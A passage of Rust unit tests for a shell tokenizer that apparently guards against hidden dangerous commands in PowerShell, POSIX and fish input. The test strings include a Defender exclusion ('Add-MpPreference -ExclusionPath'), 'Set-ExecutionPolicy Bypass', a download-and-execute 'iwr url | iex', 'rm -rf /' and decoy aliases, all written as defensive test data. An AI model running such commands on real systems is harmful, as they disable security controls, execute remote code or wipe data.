        assert_eq!(segs[0].preceding_separator.as_deref(), Some(";"));
        assert_byte_ranges_match_raw(input, &segs);

        let embedded = "Write-Output foo<#bar; Add-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(embedded, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].args, vec!["foo<#bar"]);
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(embedded, &segs);

        let quote_only =
            "Write-Output \"x\"<# ; Set-Alias decoy #>; Add-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(quote_only, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].args, vec!["\"x\""]);
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(quote_only, &segs);
    }

    #[test]
    fn powershell_backtick_newline_joins_the_effective_command_word() {
        for newline in ["\n", "\r", "\r\n"] {
            let input = format!("Set-`{newline}Item Alias:Evil Add-MpPreference");
            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("Set-Item"));
            assert_eq!(segs[0].args, vec!["Alias:Evil", "Add-MpPreference"]);
            assert_byte_ranges_match_raw(&input, &segs);
        }

        let cr_statements = "Write-Output safe\rAdd-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(cr_statements, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(cr_statements, &segs);

        let continued = "Invoke-`\rExpression 'Write-Output safe'";
        let segs = tokenize(continued, ShellType::PowerShell);
        assert_eq!(segs.len(), 1, "{segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("Invoke-Expression"));
        assert_eq!(
            crate::rules::command::normalize_cmd_base(
                segs[0].command.as_deref().unwrap_or_default(),
                ShellType::PowerShell,
            ),
            "invoke-expression"
        );
    }

    #[test]
    fn powershell_unicode_whitespace_splits_words_without_corrupting_ranges() {
        for separator in ['\u{00a0}', '\u{2028}', '\u{2029}'] {
            let input = format!(
                "{separator}Write-Output{separator}safe{separator};{separator}Add-MpPreference{separator}-ExclusionPath{separator}C:\\Temp{separator}"
            );
            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "U+{:04X}: {segs:?}", separator as u32);
            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
            assert_eq!(segs[0].args, vec!["safe"]);
            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
            assert_eq!(segs[1].args, vec!["-ExclusionPath", "C:\\Temp"]);
            assert_byte_ranges_match_raw(&input, &segs);
        }
    }

    #[test]
    fn powershell_smart_quotes_keep_contents_inert_and_suffix_visible() {
        for (open, close) in [
            ('\u{2018}', '\u{2019}'),
            ('\u{2019}', '\u{2018}'),
            ('\u{201a}', '\u{2019}'),
            ('\u{2018}', '\u{201a}'),
            ('\u{201b}', '\u{2019}'),
            ('\u{2018}', '\u{201b}'),
            ('\u{201c}', '\u{201d}'),
            ('\u{201d}', '\u{201c}'),
            ('\u{201e}', '\u{201d}'),
            ('\u{201c}', '\u{201e}'),
        ] {
            let input = format!(
                "Write-Output {open}literal ; Set-Alias decoy Add-MpPreference{close}; Add-MpPreference -ExclusionPath C:\\Temp"
            );
            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
            assert!(segs[0].raw.contains("Set-Alias decoy"));
            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
            assert_byte_ranges_match_raw(&input, &segs);
        }
    }

    #[test]
    fn powershell_here_strings_accept_header_space_and_matching_quote_classes() {
        for (open, close) in [
            ('\'', '\''),
            ('"', '"'),
            ('\u{2018}', '\u{2019}'),
            ('\u{2019}', '\u{201a}'),
            ('\u{201c}', '\u{201d}'),
            ('\u{201d}', '\u{201e}'),
        ] {
            let input = format!(
                "Write-Output @{open} \t\r\nliteral {close} }} ; Set-Alias decoy Add-MpPreference\r\n{close}@; Add-MpPreference -ExclusionPath C:\\Temp"
            );
            let marker = input.find('@').expect("here-string marker");
            let here_string = powershell_here_string(&input, marker)
                .unwrap_or_else(|| panic!("here-string was not parsed: {input:?}"));
            assert_eq!(here_string.kind, powershell_quote_kind(open).unwrap());
            assert!(input[here_string.content_start..here_string.content_end]
                .contains("Set-Alias decoy"));

            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
            assert!(segs[0].raw.contains("Set-Alias decoy"));
            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
            assert_byte_ranges_match_raw(&input, &segs);
        }

        assert!(powershell_here_string("@\u{201c}\nvalue\n\u{2019}@", 0).is_none());
        assert!(powershell_here_string("@\"not-a-header\nvalue\n\"@", 0).is_none());
    }

    #[test]
    fn powershell_stop_parsing_is_literal_only_until_the_physical_newline() {
        for source in [
            "--%", "--% ", "--%&", "--%(", "--%)", "--%,", "--%;", "--%{", "--%|", "--%}",
        ] {
            let indexed: Vec<(usize, char)> = source.char_indices().collect();
            assert!(
                powershell_stop_parsing_token(&indexed, 0, PowerShellTokenClass::Start),
                "{source:?}"
            );
        }
        let ordinary: Vec<(usize, char)> = "--%foo".char_indices().collect();
        assert!(!powershell_stop_parsing_token(
            &ordinary,
            0,
            PowerShellTokenClass::Start
        ));

        for newline in ["\n", "\r", "\r\n"] {
            let input = format!(
                "native.exe --% \"unterminated ; Set-Alias decoy Add-MpPreference # literal{newline}Set-Alias Real Add-MpPreference"
            );
            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("native.exe"));
            assert!(segs[0].raw.contains("; Set-Alias decoy"));
            assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
            assert_eq!(segs[1].args, vec!["Real", "Add-MpPreference"]);
            assert_byte_ranges_match_raw(&input, &segs);
        }

        let adjacent =
            "native.exe --%; Set-Alias decoy Add-MpPreference\nSet-Alias Real Add-MpPreference";
        let segs = tokenize(adjacent, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert!(segs[0].raw.contains("; Set-Alias decoy"));
        assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
        assert_byte_ranges_match_raw(adjacent, &segs);

        for separator in ["|", "&&"] {
            let input = format!(
                "native.exe --% literal # data {separator} Add-MpPreference -ExclusionPath C:\\Temp"
            );
            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
            assert_eq!(segs[1].preceding_separator.as_deref(), Some(separator));
            assert_byte_ranges_match_raw(&input, &segs);
        }

        let quoted =
            "native.exe --% \"literal | && ; Set-Alias decoy\"\nSet-Alias Real Add-MpPreference";
        let segs = tokenize(quoted, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert!(segs[0].raw.contains("| && ; Set-Alias decoy"));
        assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
        assert_byte_ranges_match_raw(quoted, &segs);

        for (open, close) in [
            ('"', '"'),
            ('\u{201c}', '\u{201d}'),
            ('\u{201e}', '\u{201c}'),
        ] {
            let input = format!(
                "native.exe --% {open}literal | && ; Set-Alias decoy{close} | Add-MpPreference -ExclusionPath C:\\Temp"
            );
            let segs = tokenize(&input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("native.exe"));
            assert!(segs[0].raw.contains("Set-Alias decoy"));
            assert_eq!(segs[1].preceding_separator.as_deref(), Some("|"));
            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
            assert_byte_ranges_match_raw(&input, &segs);
        }

        let quote_only = "Write-Output \"x\"--%; Set-Alias decoy Add-MpPreference\nSet-Alias Real Add-MpPreference";
        let segs = tokenize(quote_only, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert!(segs[0].raw.contains("--%; Set-Alias decoy"));
        assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
        assert_byte_ranges_match_raw(quote_only, &segs);

        let compound = "Write-Output x\"y\"--%; Add-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(compound, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(compound, &segs);

        let control = "native.exe arg--% ; Add-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(control, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(control, &segs);

        let right_boundary = "native.exe --%foo ; Add-MpPreference -ExclusionPath C:\\Temp";
        let segs = tokenize(right_boundary, ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].args, vec!["--%foo"]);
        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
        assert_byte_ranges_match_raw(right_boundary, &segs);
    }

    #[test]
    fn ps_tokenizer_splits_on_double_ampersand() {
        let segs = tokenize(
            "Get-Date && Set-ExecutionPolicy Bypass",
            ShellType::PowerShell,
        );
        assert_eq!(segs.len(), 2, "expected 2 segments, got {:?}", segs);
        assert_eq!(segs[0].command.as_deref(), Some("Get-Date"));
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("&&"));
        assert_eq!(segs[1].command.as_deref(), Some("Set-ExecutionPolicy"));
    }

    #[test]
    fn ps_tokenizer_splits_on_double_pipe() {
        let segs = tokenize(
            "Get-Date || Set-ExecutionPolicy Bypass",
            ShellType::PowerShell,
        );
        assert_eq!(segs.len(), 2, "expected 2 segments, got {:?}", segs);
        assert_eq!(segs[0].command.as_deref(), Some("Get-Date"));
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("||"));
        assert_eq!(segs[1].command.as_deref(), Some("Set-ExecutionPolicy"));
    }

    #[test]
    fn ps_tokenizer_double_pipe_not_two_single_pipes() {
        // Critical precedence check: `||` must be consumed as ONE separator,
        // not two pipes producing three segments.
        let segs = tokenize("a || b", ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "expected 2 segments (||), got {:?}", segs);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("||"));
    }

    #[test]
    fn ps_tokenizer_single_pipe_still_works() {
        // Regression guard — the `||` lookahead must not break plain `|`.
        let segs = tokenize("iwr url | iex", ShellType::PowerShell);
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("|"));
    }

    #[test]
    fn powershell_invocation_groups_keep_nested_separators_scoped() {
        let segs = tokenize(
            "& { Write-Output ready; Add-MpPreference -ExclusionPath C:\\Temp } ; Get-Date",
            ShellType::PowerShell,
        );
        assert_eq!(segs.len(), 2, "{segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("&"));
        assert!(segs[0].raw.contains("Add-MpPreference"));
        assert_eq!(segs[1].command.as_deref(), Some("Get-Date"));
        assert_eq!(segs[1].preceding_separator.as_deref(), Some(";"));
    }

    #[test]
    fn powershell_call_operator_after_assignment_is_not_background() {
        let segs = tokenize(
            "$result = & { Write-Output ready; Get-Date }",
            ShellType::PowerShell,
        );
        assert_eq!(segs.len(), 1, "{segs:?}");
        assert!(segs[0].raw.contains("& {"));

        let background = tokenize("Get-Date & Get-Process", ShellType::PowerShell);
        assert_eq!(background.len(), 2, "{background:?}");
        assert_eq!(background[1].preceding_separator.as_deref(), Some("&"));
    }

    #[test]
    fn ps_tokenizer_background_ampersand_starts_a_new_segment() {
        let segs = tokenize("Get-Job & Get-Process", ShellType::PowerShell);
        assert_eq!(segs.len(), 2, "expected background split, got {segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("Get-Job"));
        assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
        assert_eq!(segs[1].command.as_deref(), Some("Get-Process"));
    }

    #[test]
    fn powershell_data_word_or_escaped_redirection_cannot_hide_background_command() {
        for input in [
            "Write-Output return & Add-MpPreference -ExclusionPath C:\\Temp",
            "Write-Output `>& Add-MpPreference -ExclusionPath C:\\Temp",
        ] {
            let segs = tokenize(input, ShellType::PowerShell);
            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
            assert_eq!(
                segs[1].command.as_deref(),
                Some("Add-MpPreference"),
                "{input:?} -> {segs:?}"
            );
        }
    }

    #[test]
    fn powershell_multiline_literals_do_not_corrupt_the_following_command() {
        for input in [
            "<#\n'\n#>\nAdd-MpPreference -ExclusionPath C:\\Temp",
            "$x = @'\n'\n'@\nAdd-MpPreference -ExclusionPath C:\\Temp",
        ] {
            let segs = tokenize(input, ShellType::PowerShell);
            assert_eq!(
                segs.last().and_then(|segment| segment.command.as_deref()),
                Some("Add-MpPreference"),
                "{input:?} -> {segs:?}"
            );
        }
    }

    #[test]
    fn ps_tokenizer_leading_ampersand_remains_the_call_operator() {
        let segs = tokenize("& 'Set-ExecutionPolicy' Bypass", ShellType::PowerShell);
        assert_eq!(segs.len(), 1, "expected one call segment, got {segs:?}");
        assert_eq!(segs[0].command.as_deref(), Some("&"));
        assert_eq!(segs[0].args, vec!["'Set-ExecutionPolicy'", "Bypass"]);
    }

    #[test]
    fn ps_tokenizer_redirection_ampersand_is_not_a_background_separator() {
        let segs = tokenize("Write-Error boom 2>&1", ShellType::PowerShell);
        assert_eq!(segs.len(), 1, "redirection must stay intact: {segs:?}");
        assert_eq!(segs[0].args.last().map(String::as_str), Some("2>&1"));
    }

    #[test]
    fn posix_and_fish_tokenizers_split_background_commands() {
        for shell in [ShellType::Posix, ShellType::Fish] {
            let segs = tokenize("echo ready & rm -rf /", shell);
            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
            assert_eq!(segs[1].command.as_deref(), Some("rm"));
            assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
        }
    }

    #[test]
    fn posix_nbsp_is_preserved_in_alias_and_function_names() {
        for name in ["sink\u{00a0}", "sink\u{0085}", "sink\r"] {
            let alias_input = format!("alias '{name}=bash'; echo value; {name}");
            let segs = tokenize(&alias_input, ShellType::Posix);
            assert_eq!(segs.len(), 3, "{alias_input:?} -> {segs:?}");
            assert_eq!(segs[0].command.as_deref(), Some("alias"));
            assert_eq!(segs[2].command.as_deref(), Some(name));
            assert_eq!(segs[2].raw, name);
            assert_byte_ranges_match_raw(&alias_input, &segs);

            let function_input = format!("{name}() {{ Write-Output safe; }}; {name}");
            let segs = tokenize(&function_input, ShellType::Posix);
            assert_eq!(segs.len(), 2, "{function_input:?} -> {segs:?}");
            assert!(segs[0].raw.contains("Write-Output safe;"));
            assert_eq!(segs[1].command.as_deref(), Some(name));
            assert_eq!(segs[1].raw, name);
            assert_byte_ranges_match_raw(&function_input, &segs);
        }

        for prefix in ['\u{00a0}', '\u{0085}', '\u{2003}', '\r'] {
            let name = format!("{prefix}FOO=bar");
            let input = format!("function {name} {{ bash; }}; printf ready | {name}");
            let segs = tokenize(&input, ShellType::Posix);
            assert_eq!(segs.len(), 3, "{input:?} -> {segs:?}");
            assert_eq!(segs[2].command.as_deref(), Some(name.as_str()));
            assert!(!is_env_assignment(&name));
            assert_byte_ranges_match_raw(&input, &segs);
        }
    }

    #[test]
    fn posix_comment_start_uses_effective_word_state() {
        for input in [
            "echo foo\u{00a0}#bar; printf ready | sink",
            "echo foo\u{0085}#bar; printf ready | sink",
            "echo foo\r#bar; printf ready | sink",
            "echo foo{#bar}; printf ready | sink",
            "echo foo}#bar; printf ready | sink",
            ":\\\n#not-comment; printf ready | sink",
        ] {
            let segs = tokenize(input, ShellType::Posix);
            assert_eq!(segs.len(), 3, "{input:?} -> {segs:?}");
            assert_eq!(segs[1].command.as_deref(), Some("printf"));
            assert_eq!(segs[2].command.as_deref(), Some("sink"));
            assert_byte_ranges_match_raw(input, &segs);
        }

        let comment = "echo safe \\\n# real comment; hidden\nprintf ready | sink";
        let segs = tokenize(comment, ShellType::Posix);
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("printf"));
        assert_eq!(segs[2].command.as_deref(), Some("sink"));
        assert_byte_ranges_match_raw(comment, &segs);

        let leading_brace = "{#not-comment; printf ready | sink";
        let segs = tokenize(leading_brace, ShellType::Posix);
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("printf"));
        assert_eq!(segs[2].command.as_deref(), Some("sink"));
        assert_byte_ranges_match_raw(leading_brace, &segs);

        let closing_brace = "{ echo safe; }#not-comment; sink(){ bash; }; }\nprintf ready | sink";
        let segs = tokenize(closing_brace, ShellType::Posix);
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("printf"));
        assert_eq!(segs[2].command.as_deref(), Some("sink"));
        assert_byte_ranges_match_raw(closing_brace, &segs);

        let parameter = "echo ${#value}; printf ready | sink";
        let segs = tokenize(parameter, ShellType::Posix);
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("printf"));
        assert_eq!(segs[2].command.as_deref(), Some("sink"));
        assert_byte_ranges_match_raw(parameter, &segs);

        let escaped_dollar = "echo \\${value; printf ready | sink";
        let segs = tokenize(escaped_dollar, ShellType::Posix);
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert_eq!(segs[1].command.as_deref(), Some("printf"));
        assert_eq!(segs[2].command.as_deref(), Some("sink"));
        assert_byte_ranges_match_raw(escaped_dollar, &segs);
    }

    #[test]
    fn posix_function_keyword_allows_only_line_continuation_splicing() {
        let input = "func\\\ntion sink { bash; }; printf ready | sink";
        let segs = tokenize(input, ShellType::Posix);
        assert_eq!(segs.len(), 3, "{segs:?}");
        assert!(segs[0].raw.contains("bash;"));
        assert_eq!(segs[1].command.as_deref(), Some("printf"));
        assert_eq!(segs[2].command.as_deref(), Some("sink"));
        assert_byte_ranges_match_raw(input, &segs);

        let quoted = "'func'tion sink { bash; }; printf ready | sink";
        let segs = tokenize(quoted, ShellType::Posix);
        assert_eq!(
            segs.len(),
            4,
            "quoted text must not become the function reserved word: {segs:?}"
        );
        assert_eq!(segs[1].command.as_deref(), Some("}"));
    }

    #[test]
    fn escaped_redirection_character_does_not_consume_adjacent_ampersand() {
        for shell in [ShellType::Posix, ShellType::Fish] {
            let input = "echo \\>& rm -rf /";
            let segs = tokenize(input, shell);
            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
            assert_eq!(segs[1].command.as_deref(), Some("rm"));
            assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
        }
    }

    #[test]
    fn posix_ampersand_redirections_and_quotes_remain_in_one_segment() {
        for shell in [ShellType::Posix, ShellType::Fish] {
            for input in [
                "echo boom 2>&1",
                "cat 0<&1",
                "cat 3<&-",
                "echo boom &>combined.log",
                "echo '&'",
            ] {
                let segs = tokenize(input, shell);
                assert_eq!(
                    segs.len(),
                    1,
                    "{shell:?} redirection/quote was split: {input:?} -> {segs:?}"
                );
            }

            let segs = tokenize("cat 0<&1 & echo done", shell);
            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
            assert_eq!(segs[0].args.last().map(String::as_str), Some("0<&1"));
            assert_eq!(segs[1].command.as_deref(), Some("echo"));
            assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
        }
    }

    #[test]
    fn posix_nested_control_operators_are_not_outer_segment_boundaries() {
        for shell in [ShellType::Posix, ShellType::Fish] {
            for input in [
                "echo $((1&2)) && echo done",
                "diff <(echo a & echo b) <(echo c) && echo done",
                "safe() { echo ready; rm -rf /; } && echo defined",
            ] {
                let segs = tokenize(input, shell);
                assert_eq!(segs.len(), 2, "{shell:?}: {input:?} -> {segs:?}");
                assert_eq!(segs[1].preceding_separator.as_deref(), Some("&&"));
                assert_eq!(segs[1].command.as_deref(), Some("echo"));
            }
        }
    }

    /// A `#` inside `${...}` is part of the parameter word, and a comment in
    /// a backtick body ends at the closing backtick. Reading either as a
    /// comment to the end of the line hid every command after it (bash,
    /// dash, zsh and ksh run `sink` in each input below).
    #[test]
    fn hash_in_parameter_or_backtick_body_hides_no_later_command() {
        let parameter = [
            "echo ${x:- #} ; printf ready | sink",
            "echo ${x:- #}\nprintf ready | sink",
            "echo ${x:- #}\n\nprintf ready | sink",
            "echo ${x:- #} && printf ready | sink",
            "echo ${x:- #'}'} ; printf ready | sink",
            "echo ${x:-${y:- #}} ; printf ready | sink",
            // A comment in a `$(...)` inside `${...}` is still a comment.
            "echo ${x:-$(true # it's\n)} ; printf ready | sink",
        ];
        for input in parameter {
            let segs = tokenize(input, ShellType::Posix);
            let commands: Vec<_> = segs.iter().map(|seg| seg.command.as_deref()).collect();
            assert!(
                commands.ends_with(&[Some("printf"), Some("sink")]),
                "{input:?} -> {segs:?}"
            );
            assert_eq!(segs[0].command.as_deref(), Some("echo"), "{input:?}");
        }
        for input in &parameter[..6] {
            assert_byte_ranges_match_raw(input, &tokenize(input, ShellType::Posix));
        }
        for input in [
            "echo `echo a #x` ; printf ready | sink",
            "x=`echo a #x` ; printf ready | sink",
            "echo ${x:-`echo #it's`} ; printf ready | sink",
            "echo `echo a #x \\` y` ; printf ready | sink",
            "x=`echo a\necho b #x` ; printf ready | sink",
        ] {
            let segs = tokenize(input, ShellType::Posix);
            let commands: Vec<_> = segs.iter().map(|seg| seg.command.as_deref()).collect();
            assert!(
                commands.ends_with(&[Some("printf"), Some("sink")]),
                "{input:?} -> {segs:?}"
            );
        }

        // Comments that stay comments: at the top level, in a backtick body
        // up to its closing backtick, in a `$(...)` to the end of the line
        // (a backtick there is comment text), and in a `$(...)` inside
        // `${...}`.
        for input in [
            "echo hi # ${x:- ; printf ready | sink",
            "echo `echo a # printf ready | sink`",
            "echo $(echo a # ` ; printf ready | sink\n)",
            "echo ${x:-$(true # } ; printf ready | sink\n)}",
        ] {
            let segs = tokenize(input, ShellType::Posix);
            assert!(
                !segs
                    .iter()
                    .any(|seg| seg.command.as_deref() == Some("sink")),
                "{input:?} -> {segs:?}"
            );
        }

        // Fish has neither `${...}` nor backtick substitutions: unchanged.
        for input in ["echo ${x:- #} ; sink", "echo `a #b` ; sink"] {
            let segs = tokenize(input, ShellType::Fish);
            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
        }
    }

    /// Only the innermost scope closes: inside `${...}` a `(`, `)` or `{` is
    /// a plain byte, a `}` in a `$(...)` or backtick body does not close the
    /// `${...}` around it, and a backtick body cannot leave a scope open. A
    /// `{` opens `${...}` after an odd run of `$` outside `${...}` (`$$` is
    /// one parameter), backslash-newlines removed. A `#` first in a backtick
    /// body is a comment that ends at the closing backtick. Each misreading
    /// hid every later command; bash or dash (most also zsh or ksh) run
    /// `sink` in every input below.
    #[test]
    fn scopes_close_innermost_first_and_hide_no_later_command() {
        let runs_sink = |input: &str| {
            tokenize(input, ShellType::Posix)
                .iter()
                .map(|seg| seg.command.as_deref())
                .collect::<Vec<_>>()
                .windows(2)
                .any(|pair| pair == [Some("printf"), Some("sink")])
        };
        let plain_bytes = [
            "echo ${x:-(}\necho }\nprintf ready | sink",
            "echo ${x:- #(} && printf ready | sink",
            "echo ${x:- #(} ; printf ready | sink",
            "echo ${x//(/_}\nprintf ready | sink",
            "echo ${x:-${y:-(}}\nprintf ready | sink",
            "echo ${x:- { } ; printf ready | sink",
            "echo ${x:-$(echo }) #} ; printf ready | sink",
        ];
        let mut missed: Vec<_> = plain_bytes
            .into_iter()
            .filter(|input| !runs_sink(input))
            .collect();
        for input in [
            "echo ${x:- #(}\necho }\nprintf ready | sink",
            "echo ${x:- #(}\n: } ; printf ready | sink",
            "echo ${x:- #((}\necho }\nprintf ready | sink",
            "echo ${x:-`true #`(}\necho }\nprintf ready | sink",
            "echo ${x:-`echo }` #} ; printf ready | sink",
            "echo `echo ${x:-`\nprintf ready | sink",
            "echo ${x:-`echo (`}\nprintf ready | sink",
            "echo `echo (`\nprintf ready | sink",
            // `(` still opens `$(`, `$((`, `<(` and `>(` inside `${...}`.
            "echo ${x:-$(echo a)} ; printf ready | sink",
            "echo ${x:-$((1+2))} ; printf ready | sink",
            "echo ${x:-<(true)} ; printf ready | sink",
            "echo ${x:-a(b)c} ; printf ready | sink",
            // `$$` and then a plain `{`.
            "echo $${x # it's\necho a}b\nprintf ready | sink\n# '}",
            "x=$${ #it's\necho }\nprintf ready | sink\n#'}",
            "echo $$$${x # it's\necho a}b\nprintf ready | sink\n# '}",
            "x=$${ #(\n: } && printf ready | sink",
            "echo $${x ; printf ready | sink",
            "echo $${x\nprintf ready | sink",
            "echo $\\\n$\\\n{x # it's\necho a}b\nprintf ready | sink\n# '}",
            // An odd run, an escaped `$`, or a backslash-newline: `${`.
            "echo $$${x:- #} ; printf ready | sink",
            "echo \\$${x:- #} ; printf ready | sink",
            "echo $\\\n{x:- #} ; printf ready | sink",
            // A `#` first in a backtick body.
            "echo `#it's` ; printf ready | sink",
            "x=`#it's`; printf ready | sink",
            "x=`#it's` ; printf ready | sink",
            "echo `#it's` && printf ready | sink",
            "echo `#'` ; printf ready | sink",
            "echo ${x:-`#it's`} ; printf ready | sink",
            "echo `#it's`\nprintf ready | sink",
            "x=`(echo a #x` ; printf ready | sink",
        ] {
            if !runs_sink(input) {
                missed.push(input);
            }
        }
        assert!(missed.is_empty(), "{missed:#?}");
        for input in plain_bytes {
            assert_byte_ranges_match_raw(input, &tokenize(input, ShellType::Posix));
        }

        // Comments that stay comments.
        for input in [
            "echo `#printf ready | sink`",
            "echo $${x} # ; printf ready | sink",
            "echo ${x:-(} # ; printf ready | sink",
            "echo `echo ${x:-` # ; printf ready | sink",
        ] {
            let segs = tokenize(input, ShellType::Posix);
            assert!(
                !segs
                    .iter()
                    .any(|seg| seg.command.as_deref() == Some("sink")),
                "{input:?} -> {segs:?}"
            );
        }

        // Fish keeps counting every `(` and `$`-brace.
        for input in ["echo ${x:-(} ; sink", "echo $${x ; sink"] {
            let segs = tokenize(input, ShellType::Fish);
            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
        }
    }

    /// The shells cut a backtick body out at its first unescaped backtick
    /// before they read the quotes in it, so a quote in the body never runs
    /// past that backtick (`` echo `echo it's` `` ends there). In double
    /// quotes a `$(...)` or backtick body is read as code with its own
    /// quotes (`"$(echo '"')"` is one word) and the double-quoted text
    /// resumes after it. Reading such a quote as running on hid every later
    /// command, and once a backtick body was isolated (closing it restores
    /// the paren and brace scopes) it also kept a later `)` or `}` from
    /// closing. bash and ksh (most also dash and zsh) run `sink` in every
    /// input below.
    #[test]
    fn quotes_end_at_the_backtick_and_double_quoted_bodies_are_code() {
        let runs_sink = |input: &str| {
            tokenize(input, ShellType::Posix)
                .iter()
                .map(|seg| seg.command.as_deref())
                .collect::<Vec<_>>()
                .windows(2)
                .any(|pair| pair == [Some("printf"), Some("sink")])
        };
        let inputs = [
            "echo `echo it's`\nprintf ready | sink",
            "x=`printf it's`\nprintf ready | sink",
            "echo `echo say \"hi`\nprintf ready | sink",
            "echo `echo it's` ; printf ready | sink",
            "echo `echo it's` `echo it's`\nprintf ready | sink",
            "echo `echo 'a\\\\`\nprintf ready | sink",
            "(\n  echo `echo it's`\n  # it's\n)\nprintf ready | sink",
            "{\n  echo `echo it's`\n  # it's\n}\nprintf ready | sink",
            "x=$(\n  echo `echo it's`\n  # it's\n)\nprintf ready | sink",
            "f() {\n  echo `echo it's`\n  # it's\n}\nprintf ready | sink",
            "(\n  echo `echo say \"hi`\n  # \"\n)\nprintf ready | sink",
            "echo `echo it's`\n# it's\n# run `npm i` then 'x\nprintf ready | sink",
            // A backtick body in double quotes.
            "echo \"`echo \"`\"\nprintf ready | sink",
            "x=\"`printf \"`\"\nprintf ready | sink",
            "(\n  echo \"`echo \"`\"\n)\nprintf ready | sink",
            "( echo \"`echo \"`\" )\nprintf ready | sink",
            "echo \"`#it's`\"\nprintf ready | sink",
            // A `$(...)` in double quotes.
            "echo \"$(echo '\"')\"\nprintf ready | sink",
            "echo \"$(echo '\"')\" ; printf ready | sink",
            "x=\"$(printf '\"')\"\nprintf ready | sink",
            "echo \"$(echo a # \"\n)\"\nprintf ready | sink",
            "echo \"${x:-$(echo \")\")}\"\nprintf ready | sink",
            "echo \"$$$(echo ')')\"\nprintf ready | sink",
            "echo \"$(echo \"$(echo ')')\")\"\nprintf ready | sink",
            "echo \"$(echo `echo '\"'`)\"\nprintf ready | sink",
        ];
        let missed: Vec<_> = inputs
            .into_iter()
            .filter(|input| !runs_sink(input))
            .collect();
        assert!(missed.is_empty(), "{missed:#?}");
        // A comment skipped inside a scope leaves the segment's raw text
        // shorter than the input, as before; the rest map back exactly.
        for input in inputs.into_iter().filter(|input| !input.contains('#')) {
            assert_byte_ranges_match_raw(input, &tokenize(input, ShellType::Posix));
        }

        // Text that stays quoted, or a comment.
        for input in [
            // `$$(` is the PID and a plain `(` in every shell.
            "echo \"$$(printf ready | sink)\"",
            "echo \"$(echo ')')\" # printf ready | sink",
            "echo `echo 'a\\`b'` # ; printf ready | sink",
            "echo \"`echo \"`\" # printf ready | sink",
        ] {
            let segs = tokenize(input, ShellType::Posix);
            assert!(
                !segs
                    .iter()
